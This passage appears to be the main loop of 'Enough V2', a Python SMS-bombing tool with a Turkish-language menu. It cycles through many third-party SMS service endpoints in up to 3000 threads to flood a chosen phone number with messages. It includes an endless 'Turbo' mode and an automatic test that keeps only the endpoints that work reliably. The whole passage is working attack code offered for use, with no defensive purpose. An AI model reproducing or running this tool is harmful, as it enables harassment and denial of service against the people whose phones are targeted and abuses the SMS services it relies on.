    if callable(attribute_value):
        if not attribute.startswith('__'):
            servisler_sms.append(attribute)

def split_services(services: List[str], thread_count: int) -> List[List[str]]:
    chunk_size = math.ceil(len(services) / thread_count)
    return [services[i:i + chunk_size] for i in range(0, len(services), chunk_size)]

def send_sms_and_log(sms: 'SendSms', service_name: str, aralik: int, verbose_logging: bool):
    result = getattr(sms, service_name)()
    if result:
        if verbose_logging:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}SMS gönderildi ({sms.adet}): {service_name}")
    else:
        if verbose_logging:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}SMS gönderilemedi: {service_name}")
    sleep(aralik)

def run_services(sms: 'SendSms', service_list: List[str], kere: Optional[int] = None, aralik: int = 0, verbose_logging: bool = True) -> 'SendSms':
    if kere is None:  
        while True:
            for service in service_list:
                send_sms_and_log(sms, service, aralik, verbose_logging)
    else:  
        while sms.adet < kere:
            for service in service_list:
                if sms.adet >= kere:
                    break
                send_sms_and_log(sms, service, aralik, verbose_logging)
    return sms # Return the sms object to get the total count

SUCCESSFUL_APIS_FILE = "successful_apis.txt"

def save_successful_apis(apis: List[str]):
    with open(SUCCESSFUL_APIS_FILE, "w", encoding="utf-8") as f:
        for api in apis:
            f.write(api + "\n")

def load_successful_apis() -> List[str]:
    try:
        with open(SUCCESSFUL_APIS_FILE, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def auto_api_test(phone: str, mail: str) -> List[str]:
    system("cls||clear")
    print(Fore.LIGHTYELLOW_EX + "API'ler test ediliyor...")
    
    current_successful_apis: List[str] = []
    sms_tester = SendSms(phone, mail)

    # İlk olarak tüm API'leri dene
    print(Fore.LIGHTCYAN_EX + "\n--- Tüm API'ler deneniyor ---" + Style.RESET_ALL)
    for service in servisler_sms:
        if getattr(sms_tester, service)():
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {service}")
            current_successful_apis.append(service)
        else:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {service}")
    
    if not current_successful_apis:
        print(Fore.LIGHTRED_EX + "\nİlk testte hiçbir API başarılı bulunamadı." + Style.RESET_ALL)
        sleep(3)
        return []

    print(f"\n{Fore.LIGHTYELLOW_EX}İlk testte başarılı API'ler: {len(current_successful_apis)} adet")
    for api in current_successful_apis:
        print(f"- {api}")
    sleep(2)

    # Başarılı olanları tekrar test et ve 3 ardışık başarıyı kontrol et
    final_successful_apis: List[str] = []
    consecutive_successes: Dict[str, int] = {api: 0 for api in current_successful_apis}
    
    test_round = 1
    while True:
        system("cls||clear")
        print(Fore.LIGHTCYAN_EX + f"\n--- Başarılı API'ler tekrar test ediliyor (Tur {test_round}) ---" + Style.RESET_ALL)
        
        apis_to_retest = list(current_successful_apis) # Mevcut başarılı API'lerin bir kopyası
        round_failures: List[str] = []

        if not apis_to_retest:
            print(Fore.LIGHTYELLOW_EX + "Tekrar test edilecek API kalmadı." + Style.RESET_ALL)
            break

        for service in apis_to_retest:
            sms_tester_retest = SendSms(phone, mail) # Her test için yeni bir örnek
            if getattr(sms_tester_retest, service)():
                consecutive_successes[service] += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı ({consecutive_successes[service]}/3): {service}")
            else:
                consecutive_successes[service] = 0 # Başarısız olursa sayacı sıfırla
                round_failures.append(service)
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız: {service}")
        
        # Bu turda başarısız olanları listeden çıkar
        for failed_api in round_failures:
            if failed_api in current_successful_apis:
                current_successful_apis.remove(failed_api)
                del consecutive_successes[failed_api] # Sayacı da temizle
        
        # 3 ardışık başarıya ulaşanları final listeye ekle ve mevcut listeden çıkar
        newly_finalized_apis: List[str] = []
        for service, count in consecutive_successes.items():
            if count >= 3 and service not in final_successful_apis:
                final_successful_apis.append(service)
                newly_finalized_apis.append(service)
        
        for finalized_api in newly_finalized_apis:
            if finalized_api in current_successful_apis:
                current_successful_apis.remove(finalized_api)
        
        if not current_successful_apis: # Tüm API'ler ya başarısız oldu ya da 3 kez başarılı oldu
            print(Fore.LIGHTYELLOW_EX + "\nTüm API'ler test edildi veya elendi." + Style.RESET_ALL)
            break
        
        print(f"\n{Fore.LIGHTYELLOW_EX}Mevcut başarılı API'ler ({len(current_successful_apis)} adet):")
        for api in current_successful_apis:
            print(f"- {api} (Ardışık başarı: {consecutive_successes.get(api, 0)})")
        print(f"{Fore.LIGHTGREEN_EX}Kesinleşen başarılı API'ler ({len(final_successful_apis)} adet):")
        for api in final_successful_apis:
            print(f"- {api}")
        
        sleep(3)
        test_round += 1

    system("cls||clear")
    print(f"\n{Fore.LIGHTYELLOW_EX}Sonuç: {len(final_successful_apis)} adet API 3 kez ardışık başarılı oldu.")
    for api in final_successful_apis:
        print(f"- {api}")
    
    if final_successful_apis:
        save_successful_apis(final_successful_apis)
        print(Fore.LIGHTGREEN_EX + f"\nBaşarılı API'ler '{SUCCESSFUL_APIS_FILE}' dosyasına kaydedildi." + Style.RESET_ALL)
    else:
        print(Fore.LIGHTRED_EX + "\nHiçbir API 3 kez ardışık başarılı olamadı." + Style.RESET_ALL)
    
    sleep(5)
    return final_successful_apis

SETTINGS_FILE = "settings.json"

def load_settings() -> Dict[str, Any]:
    try:
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "default_phone": "",
            "default_mail": "",
            "verbose_logging": True,
            "default_thread_count": 1
        }
    except json.JSONDecodeError:
        print(Fore.LIGHTRED_EX + "Ayarlar dosyası bozuk. Varsayılan ayarlar yüklenecek." + Style.RESET_ALL)
        return {
            "default_phone": "",
            "default_mail": "",
            "verbose_logging": True,
            "default_thread_count": 1
        }

def save_settings(settings: Dict[str, Any]):
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(settings, f, indent=4)
            
while 1:
    settings = load_settings() # Load settings at the beginning of each loop
    system("cls||clear")
    print(r"""{}

 /$$     /$$                   /$$$$$$  /$$           /$$$$$$$                                  /$$    
|  $$   /$$/                  /$$__  $$|__/          | $$__  $$                                | $$    
 \  $$ /$$//$$$$$$   /$$$$$$$| $$  \__/ /$$  /$$$$$$ | $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$  
  \  $$$$//$$__  $$ /$$_____/|  $$$$$$ | $$ /$$__  $$| $$$$$$$  /$$__  $$ |____  $$ /$$_____/|_  $$_/  
   \  $$/| $$$$$$$$|  $$$$$$  \____  $$| $$| $$  \__/| $$__  $$| $$$$$$$$  /$$$$$$$|  $$$$$$   | $$    
    | $$ | $$_____/ \____  $$ /$$  \ $$| $$| $$      | $$  \ $$| $$_____/ /__  $$ \____  $$  | $$ /$$
    | $$ |  $$$$$$$ /$$$$$$$/|  $$$$$$/| $$| $$      | $$$$$$$/|  $$$$$$$|  $$$$$$$ /$$$$$$$/  |  $$$$/
    |__/  \_______/|_______/  \______/ |__/|__/      |_______/  \_______/ \_______/|_______/    \___/  
                                                                                                       
                                                                                                       
                                                                                                       
                                                                                             
                                                                                             

 Enough V2 [ Discord : trewqaz ]
                                                                               

 Sms Api: {} 
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + "Enough Rev\n\n 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Auto API Testi\n\n 4- Ayarlar\n\n 5- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue

    thread_count = settings["default_thread_count"] # Use default_thread_count from settings

    if menu in [1, 2, 3]: # Added 3 to the menu options that require thread count
        # Thread sayısını al
        system("cls||clear")
        try:
            # thread_count = int(input(Fore.LIGHTYELLOW_EX + "Thread sayısını giriniz [1-3000]: " + Fore.LIGHTGREEN_EX)) # Removed this prompt
            if thread_count < 1 or thread_count > 3000:
                raise ValueError("Geçersiz thread sayısı!")
        except ValueError as e:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + str(e))
            sleep(3)
            continue

    if menu == 1:
        system("cls||clear")
        tel_no = settings["default_phone"]
        mail = settings["default_mail"]
        verbose_logging = settings["verbose_logging"]

        if not tel_no:
            print(Fore.LIGHTRED_EX + "Hata: Varsayılan telefon numarası ayarlanmamış. Lütfen ayarlardan giriniz." + Style.RESET_ALL)
            sleep(3)
            continue
        
        tel_liste: List[str] = []
        tel_liste.append(tel_no)
        sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  

        system("cls||clear")
        
        # Yeni eklenen kısım: Başarılı API'leri kullanma sorusu
        use_successful_only = input(Fore.LIGHTYELLOW_EX + "Sadece başarılı API'leri kullanmak ister misiniz? (e/h): " + Fore.LIGHTGREEN_EX).lower()
        if use_successful_only == 'e':
            selected_apis = load_successful_apis()
            if not selected_apis:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Kayıtlı başarılı API bulunamadı. Tüm API'ler kullanılacak.")
                sleep(3)
                selected_apis = servisler_sms
            else:
                print(Fore.LIGHTGREEN_EX + f"Kayıtlı {len(selected_apis)} başarılı API kullanılacak.")
                sleep(1)
        else:
            selected_apis = servisler_sms

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")

        # verbose_logging_input = input(Fore.LIGHTYELLOW_EX + "Detaylı logları görmek ister misiniz? (e/h): " + Fore.LIGHTGREEN_EX).lower() # Removed this prompt
        # verbose_logging = True if verbose_logging_input == 'e' else False # Removed this prompt
        # system("cls||clear")

        # Thread'leri başlat
        service_chunks = split_services(selected_apis, thread_count)
        
        start_time = time.time() # Record start time
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures: List[Future[None]] = []
            for tel_no in tel_liste:
                sms = SendSms(tel_no, mail)
                for chunk in service_chunks:
                    futures.append(
                        executor.submit(run_services, sms, chunk, kere, aralik, verbose_logging)
                    )
            try:
                wait(futures)
            except KeyboardInterrupt:
                system("cls||clear")
                print("\nİşlem iptal edildi...")
                sleep(2)
        end_time = time.time() # Record end time
        
        total_sms_sent = sum(f.result().adet for f in futures if f.done() and f.result() is not None) # Sum adet from all SendSms instances
        duration = end_time - start_time
        if duration > 0:
            sms_per_second = total_sms_sent / duration
            print(f"\n{Fore.LIGHTYELLOW_EX}Ortalama SMS/saniye: {sms_per_second:.2f}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.LIGHTYELLOW_EX}SMS gönderme süresi çok kısa, SMS/saniye hesaplanamadı.{Style.RESET_ALL}")
        sleep(5)


    elif menu == 2:
        system("cls||clear")
        tel_no = settings["default_phone"]
        mail = settings["default_mail"]
        verbose_logging = settings["verbose_logging"]

        if not tel_no:
            print(Fore.LIGHTRED_EX + "Hata: Varsayılan telefon numarası ayarlanmamış. Lütfen ayarlardan giriniz." + Style.RESET_ALL)
            sleep(3)
            continue

        # Yeni eklenen kısım: Başarılı API'leri kullanma sorusu
        use_successful_only = input(Fore.LIGHTYELLOW_EX + "Sadece başarılı API'leri kullanmak ister misiniz? (e/h): " + Fore.LIGHTGREEN_EX).lower()
        if use_successful_only == 'e':
            selected_apis = load_successful_apis()
            if not selected_apis:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Kayıtlı başarılı API bulunamadı. Tüm API'ler kullanılacak.")
                sleep(3)
                selected_apis = servisler_sms
            else:
                print(Fore.LIGHTGREEN_EX + f"Kayıtlı {len(selected_apis)} başarılı API kullanılacak.")
                sleep(1)
        else:
            selected_apis = servisler_sms

        system("cls||clear")
        # verbose_logging_input = input(Fore.LIGHTYELLOW_EX + "Detaylı logları görmek ister misiniz? (e/h): " + Fore.LIGHTGREEN_EX).lower() # Removed this prompt
        # verbose_logging = True if verbose_logging_input == 'e' else False # Removed this prompt
        # system("cls||clear")

        send_sms = SendSms(tel_no, mail)
        service_chunks = split_services(selected_apis, thread_count)
        
        start_time = time.time() # Record start time
        try:
            while True:
                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    futures: List[Future[None]] = []
                    for chunk in service_chunks:
                        for service in chunk:
                            futures.append(
                                executor.submit(send_sms_and_log, send_sms, service, 0, verbose_logging) # Pass verbose_logging here
                            )
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nMenüye Dönülüyor...")
            sleep(2)
        end_time = time.time() # Record end time

        total_sms_sent = send_sms.adet # For turbo mode, send_sms.adet is the total
        duration = end_time - start_time
        if duration > 0:
            sms_per_second = total_sms_sent / duration
            print(f"\n{Fore.LIGHTYELLOW_EX}Ortalama SMS/saniye: {sms_per_second:.2f}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.LIGHTYELLOW_EX}SMS gönderme süresi çok kısa, SMS/saniye hesaplanamadı.{Style.RESET_ALL}")
        sleep(5)

    elif menu == 3: # Auto API Testi
        system("cls||clear")
        tel_no = settings["default_phone"]
        mail = settings["default_mail"]
        verbose_logging = settings["verbose_logging"]

        if not tel_no:
            print(Fore.LIGHTRED_EX + "Hata: Varsayılan telefon numarası ayarlanmamış. Lütfen ayarlardan giriniz." + Style.RESET_ALL)
            sleep(3)
            continue

        successful_apis = auto_api_test(tel_no, mail)
        
        if not successful_apis:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hiçbir API başarılı bulunamadı. SMS gönderilemiyor.")
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")

        verbose_logging_input = input(Fore.LIGHTYELLOW_EX + "Detaylı logları görmek ister misiniz? (e/h): " + Fore.LIGHTGREEN_EX).lower()
        verbose_logging = True if verbose_logging_input == 'e' else False
        system("cls||clear")

        # Thread'leri başlat, sadece başarılı API'leri kullanarak (sonsuz döngü)
        send_sms = SendSms(tel_no, mail)
        service_chunks = split_services(successful_apis, thread_count)
        
        start_time = time.time() # Record start time
        try:
            while True:
                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    futures: List[Future[None]] = []
                    for chunk in service_chunks:
                        for service in chunk:
                            futures.append(
                                executor.submit(send_sms_and_log, send_sms, service, 0, verbose_logging)
                            )
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nMenüye Dönülüyor...")
            sleep(2)
        end_time = time.time() # Record end time

        total_sms_sent = send_sms.adet # For auto test mode, send_sms.adet is the total
        duration = end_time - start_time
        if duration > 0:
            sms_per_second = total_sms_sent / duration
            print(f"\n{Fore.LIGHTYELLOW_EX}Ortalama SMS/saniye: {sms_per_second:.2f}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.LIGHTYELLOW_EX}SMS gönderme süresi çok kısa, SMS/saniye hesaplanamadı.{Style.RESET_ALL}")
        sleep(5)

    elif menu == 4: # Ayarlar menüsü
        while True:
            system("cls||clear")
            print(Fore.LIGHTMAGENTA_EX + "Ayarlar Menüsü\n")
            print(f" 1- Varsayılan Telefon Numarası: {settings['default_phone']}")
            print(f" 2- Varsayılan E-posta Adresi: {settings['default_mail']}")
            print(f" 3- Detaylı Logları Göster: {'Evet' if settings['verbose_logging'] else 'Hayır'}")
            print(f" 4- Varsayılan Thread Sayısı: {settings['default_thread_count']}")
            print(" 5- Geri Dön\n")
            
            try:
                ayar_secim = int(input(Fore.LIGHTYELLOW_EX + "Seçim: " + Fore.LIGHTGREEN_EX))
                if ayar_secim == 1:
                    system("cls||clear")
                    new_phone = input(Fore.LIGHTYELLOW_EX + "Yeni varsayılan telefon numarasını giriniz (başında '+90' olmadan, 10 hane): " + Fore.LIGHTGREEN_EX)
                    if len(new_phone) == 10 and new_phone.isdigit():
                        settings["default_phone"] = new_phone
                        save_settings(settings)
                        print(Fore.LIGHTGREEN_EX + "Telefon numarası güncellendi." + Style.RESET_ALL)
                    else:
                        print(Fore.LIGHTRED_EX + "Hatalı telefon numarası formatı." + Style.RESET_ALL)
                    sleep(2)
                elif ayar_secim == 2:
                    system("cls||clear")
                    new_mail = input(Fore.LIGHTYELLOW_EX + "Yeni varsayılan e-posta adresini giriniz: " + Fore.LIGHTGREEN_EX)
                    if "@" in new_mail and ".com" in new_mail:
                        settings["default_mail"] = new_mail
                        save_settings(settings)
                        print(Fore.LIGHTGREEN_EX + "E-posta adresi güncellendi." + Style.RESET_ALL)
                    else:
                        print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi formatı." + Style.RESET_ALL)
                    sleep(2)
                elif ayar_secim == 3:
                    system("cls||clear")
                    current_setting = settings["verbose_logging"]
                    settings["verbose_logging"] = not current_setting
                    save_settings(settings)
                    print(Fore.LIGHTGREEN_EX + "Detaylı log ayarı güncellendi." + Style.RESET_ALL)
                    sleep(2)
                elif ayar_secim == 4:
                    system("cls||clear")
                    new_thread_count = input(Fore.LIGHTYELLOW_EX + "Yeni varsayılan thread sayısını giriniz [1-3000]: " + Fore.LIGHTGREEN_EX)
                    if new_thread_count.isdigit() and 1 <= int(new_thread_count) <= 3000:
                        settings["default_thread_count"] = int(new_thread_count)
                        save_settings(settings)
                        print(Fore.LIGHTGREEN_EX + "Thread sayısı güncellendi." + Style.RESET_ALL)
                    else:
                        print(Fore.LIGHTRED_EX + "Geçersiz thread sayısı. Lütfen 1 ile 3000 arasında bir değer giriniz." + Style.RESET_ALL)
                    sleep(2)
                elif ayar_secim == 5:
                    break
                else:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz." + Style.RESET_ALL)
                    sleep(2)
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz." + Style.RESET_ALL)
                sleep(2)

    elif menu == 5: # Changed from 4 to 5 for exit
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
